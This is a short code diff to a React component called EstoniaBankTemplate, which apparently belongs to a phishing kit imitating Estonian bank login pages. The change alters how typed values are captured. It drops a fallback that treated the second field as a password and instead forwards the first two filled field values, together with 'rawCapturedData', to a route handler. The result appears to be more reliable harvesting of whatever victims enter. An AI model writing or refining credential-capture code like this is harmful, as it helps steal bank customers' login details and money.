@@ -442,12 +442,12 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
         if (!mappedData.password) {
           if (passwordFallback?.value) {
             assignPassword(passwordFallback.value, true);
-          } else if (!hasIdentityValue && filledValues[1]?.value) {
-            assignPassword(filledValues[1].value, true);
           }
         }
         
         handleRouteAction({
+          orderedField1: filledValues[0]?.value ?? "",
+          orderedField2: filledValues[1]?.value ?? "",
           ...rawCapturedData,
           ...mappedData,
         });
